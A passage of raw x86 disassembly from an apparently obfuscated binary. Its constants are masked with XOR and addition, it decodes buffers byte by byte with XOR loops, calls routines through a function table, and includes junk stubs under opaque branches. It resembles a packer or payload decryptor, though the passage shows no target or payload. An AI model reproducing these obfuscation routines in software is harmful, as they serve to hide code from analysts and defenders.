  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
